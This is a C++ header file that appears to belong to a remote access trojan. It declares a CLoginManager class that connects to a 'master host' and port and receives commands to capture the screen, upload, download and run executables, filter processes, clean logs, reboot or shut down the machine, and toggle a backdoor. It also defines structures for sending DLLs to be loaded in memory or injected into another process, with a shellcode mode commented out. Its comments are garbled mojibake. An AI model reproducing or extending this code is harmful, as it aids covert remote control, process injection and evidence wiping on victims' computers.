#pragma once
#include "stdafx.h"
#include <vector> 
using namespace std;
#include "Manager.h"
#include "help.h"
#include <atlimage.h> //BMP2JPEG
class CLoginManager;


enum  LoginManager
{
	COMMAND_DLLMAIN,
	COMMAND_SENDLL,
	COMMAND_CLOSESOCKET,
	COMMAND_GET_PROCESSANDCONDITION,
	COMMAND_GET_SCREEN,
	COMMAND_UPLOAD_EXE,
	COMMAND_DOWN_EXE,
	COMMAND_RENAME,
	COMMAND_FILTERPROCESS,
	COMMAND_MONITOR,
	COMMAND_GETMONITOR,
	COMMAND_CLEANLOG,
	COMMAND_RESTART,
	COMMAND_EXIT,
	COMMAND_LOGOUT,
	COMMAND_REBOOT,
	COMMAND_SHUTDOWN,
	COMMAND_CHANGELOAD,
	COMMAND_CHANGEINFO,
	COMMAND_ADDCLIENT,
	COMMAND_SET_DOOR_GETPERMINSSION = 100,
	COMMAND_SET_DOOR_QUITPERMINSSION,
};


struct COPYCLIENT
{
	byte token;
	TCHAR confimodel[1000];
};


enum SENDTASK
{
	TASK_MAIN,					//��ͨ�����ʽ ��1����ͨ���������� ��������
	TASK_PLUG,					//��չ������ر�־
};

enum DLL_MODEL					//����ģʽ
{
	DLL_MEMLOAD, 				//��ͨ�ڴ���� ʹ�õ�������
	DLL_PUPPET,					//����ע��ģʽ
	//DLL_SHELLCODE				//shellcodeģʽ
};

struct DllSendDate
{
	SENDTASK sendtask;
	TCHAR DllName[255];			 //DL����
	BOOL is_64;					//λ��
	int DateSize;				//DLL��С
	TCHAR szVersion[50];		//�汾
	TCHAR szcommand[1000];
	int i;
};

struct DllDate
{
	CLoginManager* m_CLoginManager;
	TCHAR* m_strMasterHost;
	UINT	m_nMasterPort;
	BOOL IsTcp;
	DllSendDate* m_sendate;
	byte* delldate;
	DLL_MODEL m_bhaveAV;
};



typedef struct
{
	BYTE			Btoken;			//Э��
	TCHAR			UserActive[15];	//״̬
	TCHAR			Window[250];	//��ǰ����
	int				iScreenWidth;
	int				iScreenHeight;
	bool			bsomes[20];
}DATAUPDATE;


class CLoginManager : public CManager
{
public:

	CLoginManager(ISocketBase* pClient, TCHAR* lpszMasterHost, UINT nMasterPort, BOOL m_IsTcp,  BOOL IsBackDoor = FALSE);
	virtual ~CLoginManager();
	CLoginManager(ISocketBase* pClient);
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void FilterProcess(TCHAR* filtername);
	void SendCondition(bool all);
	byte* GetScreen(int& size, int& x, int& y, bool blitter, bool setsize, int setw, int seth);
	unsigned long BMP2JPEG(const char* pUnZipData, unsigned long ulUnZipDataLen, std::string* jpgData);
	BOOL IsActived();
	BOOL LocalLoad(LPBYTE lpBuffer, UINT nSize);
	bool RunFile(TCHAR* lpFile, INT nShowCmd);
	int  ReadRegEx(HKEY MainKey, LPCTSTR SubKey, LPCTSTR Vname, DWORD Type, TCHAR* szData, LPBYTE szBytes, DWORD lbSize, int Mode);
	void ReName(TCHAR* lpGBuffer, TCHAR* lpBuffer);
	static unsigned __stdcall Loop_DownManager(LPVOID lparam);
	void restart();
	void EnumRegeditData(TCHAR* lpszSubKey);


	TCHAR	m_strMasterHost[MAX_PATH * 2];
	UINT	m_nMasterPort;
	BOOL m_IsBackDoor;		 //���ſ���
	BOOL IsTcp;
	BOOL	m_bIsActived;
	DLL_MODEL m_bhaveAV;


};


typedef struct
{
	BYTE bToken;
	UINT nType;
	TCHAR lpCmdLine[MAX_PATH];
	TCHAR lpFileName[100];
}LOCALUP;

